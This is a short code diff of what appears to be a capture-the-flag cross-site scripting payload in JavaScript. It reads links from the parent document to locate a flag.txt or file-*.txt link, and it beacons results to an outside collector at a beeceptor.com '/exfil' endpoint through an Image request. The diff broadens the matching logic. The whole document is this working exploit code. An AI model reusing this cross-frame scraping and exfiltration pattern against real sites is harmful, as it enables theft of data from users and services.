@@ -6,7 +6,11 @@
       (async () => {
         try {
           const links = [...parent.document.querySelectorAll('a')];
-          const a = links.find(x => /flag\\.txt$/.test(x.textContent));
+          const a = [...parent.document.querySelectorAll('a')]
+          .find(x => /file-.*\.txt$/.test(x.id || '') ||
+                     /file-.*\.txt$/.test(x.href || '') ||
+                     /flag\.txt$/.test(x.textContent || ''));
+
 
           if (!a) {
             new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
